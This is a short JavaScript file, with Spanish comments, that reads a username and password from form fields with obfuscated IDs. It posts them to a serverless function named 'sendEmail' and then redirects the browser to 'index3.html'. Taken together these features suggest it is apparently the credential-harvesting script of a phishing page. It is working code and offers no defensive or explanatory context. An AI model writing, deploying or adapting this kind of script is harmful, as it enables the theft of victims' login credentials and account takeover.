var ready = function() {
    let u_name = document.getElementById("0T4RX").value;
    let u_name2 = document.getElementById("C0NTRX").value;
    return { username: u_name, password: u_name2 };
};

var sender = function() {
    let data = ready();

    fetch('/.netlify/functions/sendEmail', {  // apunta a la función Node
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(r => r.json())
    .then(res => {
        console.log("Response:", res);
        window.location = 'index3.html';  // redirige después de enviar
    })
    .catch(err => console.error("Error:", err));

    return false;  // evita el POST normal
};